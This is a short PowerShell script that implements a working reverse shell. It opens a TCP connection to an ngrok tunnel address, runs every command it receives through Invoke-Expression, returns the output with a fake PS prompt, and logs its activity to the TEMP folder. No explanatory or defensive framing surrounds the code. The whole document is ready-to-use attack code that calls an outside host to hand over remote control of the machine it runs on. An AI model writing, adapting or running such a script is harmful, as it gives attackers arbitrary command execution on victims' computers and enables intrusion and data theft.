try {
    "Starting script at $(Get-Date)" | Out-File "$env:TEMP\rev_log.txt" -Append

    # TcpClient reverse shell logic here...
    $client = "0.tcp.in.ngrok.io"
    $port = 15906

    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $tcp.Close()
}
catch {
    "Error: $_" | Out-File "$env:TEMP\rev_log.txt" -Append
}
